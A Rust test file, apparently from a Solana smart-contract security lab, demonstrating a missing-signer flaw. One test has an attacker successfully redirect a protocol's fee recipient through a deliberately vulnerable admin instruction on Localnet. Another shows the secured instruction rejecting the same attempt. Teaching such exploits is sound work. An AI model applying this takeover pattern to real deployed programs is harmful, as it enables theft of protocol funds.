use std::sync::Arc;

use account_substitution_lab::InitializeProfile;
use anchor_client::{
    solana_sdk::{
        commitment_config::CommitmentConfig,
        native_token::LAMPORTS_PER_SOL,
        pubkey::Pubkey,
        signature::{read_keypair_file, Keypair},
        signer::Signer,
        system_instruction,
        system_program,
        transaction::Transaction,
    },
    Client, Cluster, Program,
};

use missing_signer_admin_lab::{
    accounts::{
        InitializeConfig, UpdateFeeRecipientSecure, UpdateFeeRecipientVulnerable,
    },
    instruction,
    ProtocolConfig,
};

fn get_program() -> (Program<Arc<Keypair>>, Arc<Keypair>) {
    let anchor_wallet = std::env::var("ANCHOR_WALLET").unwrap();
    let payer = Arc::new(read_keypair_file(&anchor_wallet).unwrap());

    let client = Client::new_with_options(
        Cluster::Localnet,
        payer.clone(),
        CommitmentConfig::confirmed(),
    );

    let program = client.program(missing_signer_admin_lab::ID).unwrap();
    (program, payer)
}

fn fund_account(
    program: &Program<Arc<Keypair>>,
    payer: &Arc<Keypair>,
    recipient: &Pubkey,
    amount: u64,
) {
    let recent_blockhash = program.rpc().get_latest_blockhash().unwrap();

    let tx = Transaction::new_signed_with_payer(
        &[system_instruction::transfer(&payer.pubkey(), recipient, amount)],
        Some(&payer.pubkey()),
        &[payer.as_ref()],
        recent_blockhash,
    );

    program.rpc().send_and_confirm_transaction(&tx).unwrap();
}


#[test]
fn missing_signer_allows_fee_recipient_takeover_on_vulnerable_instruction() {
    let (program, payer) = get_program();

    let real_admin = Keypair::new();
    let attacker = Keypair::new();
    let initial_fee_recipient = Keypair::new();
    let protocol_config = Keypair::new();

    fund_account(&program, &payer, &attacker.pubkey(), LAMPORTS_PER_SOL);
    fund_account(&program, &payer, &real_admin.pubkey(), LAMPORTS_PER_SOL);

    let init_sig = program.request()
            .accounts(InitializeConfig {
                protocol_config: protocol_config.pubkey(),
                admin: real_admin.pubkey(),
                system_program: system_program::ID,
            })
            .args(instruction::InitializeConfig {
                fee_recipient: initial_fee_recipient.pubkey(),
            })
            .signer(&protocol_config)
            .signer(&real_admin)
            .send();

    assert!(init_sig.is_ok(), "Failed to initialize config: {:?}", init_sig.err());

    let before_attack: ProtocolConfig = program.account(protocol_config.pubkey()).unwrap();
    assert_eq!(before_attack.admin, real_admin.pubkey());
    assert_eq!(before_attack.fee_recipient, initial_fee_recipient.pubkey());

    let attack_sig = program.request()
                .accounts(UpdateFeeRecipientVulnerable {
                    payer: attacker.pubkey(),
                    admin: real_admin.pubkey(),
                    protocol_config: protocol_config.pubkey(),
                })
                .args(instruction::UpdateFeeRecipientVulnerable {
                    new_fee_recipient: attacker.pubkey(),
                })
                .signer(&attacker)
                .send();

    assert!(attack_sig.is_ok(), "Attacker should succeed against vulnerable instruction: {:?}", attack_sig.is_err());

    let after_attack: ProtocolConfig = program.account(protocol_config.pubkey()).unwrap();
    assert_eq!(after_attack.fee_recipient, attacker.pubkey());
    assert_eq!(after_attack.admin, real_admin.pubkey());
    assert!(!after_attack.paused);
}

#[test]
fn missing_signer_attack_fails_on_secure_instruction() {
    let (program, payer) = get_program();

    let real_admin = Keypair::new();
    let attacker = Keypair::new();
    let initial_fee_recipient = Keypair::new();
    let protocol_config = Keypair::new();

    fund_account(&program, &payer, &attacker.pubkey(), LAMPORTS_PER_SOL);
    fund_account(&program, &payer, &real_admin.pubkey(), LAMPORTS_PER_SOL);

    let init_sig = program.request()
                        .accounts(InitializeConfig {
                            protocol_config: protocol_config.pubkey(),
                            admin: real_admin.pubkey(),
                            system_program: system_program::ID,
                        })
                        .args(instruction::InitializeConfig {
                            fee_recipient: initial_fee_recipient.pubkey()
                        })
                        .signer(&protocol_config)
                        .signer(&real_admin)
                        .send();

    assert!(init_sig.is_ok(), "Failed to initialize config: {:?}", init_sig.err());

    let before_attack: ProtocolConfig = program.account(protocol_config.pubkey()).unwrap();
    assert_eq!(before_attack.admin, real_admin.pubkey());
    assert_eq!(before_attack.fee_recipient, initial_fee_recipient.pubkey());

    // Build the instruction without sending it
    let ix = program
        .request()
        .accounts(UpdateFeeRecipientSecure {
            payer: attacker.pubkey(),
            admin: real_admin.pubkey(),
            protocol_config: protocol_config.pubkey(),
        })
        .args(instruction::UpdateFeeRecipientSecure {
            new_fee_recipient: attacker.pubkey(),
        })
        .instructions()
        .unwrap()
        .remove(0);

    let recent_blockhash = program.rpc().get_latest_blockhash().unwrap();

    let mut tx = Transaction::new_with_payer(&[ix], Some(&attacker.pubkey()));

    // Only attacker signs; real_admin is missing
    let sign_result = tx.try_sign(&[&attacker], recent_blockhash);

    assert!(
        sign_result.is_err(),
        "Transaction signing should fail because real admin did not sign"
    );

    let err = sign_result.err().unwrap().to_string();

    assert!(
        err.to_lowercase().contains("not enough signers"),
        "Expected not enough signers error, got: {}",
        err
    );

    let after_attempt: ProtocolConfig = program.account(protocol_config.pubkey()).unwrap();
    assert_eq!(after_attempt.admin, real_admin.pubkey());
    assert_eq!(after_attempt.fee_recipient, initial_fee_recipient.pubkey());
    assert!(!after_attempt.paused);
}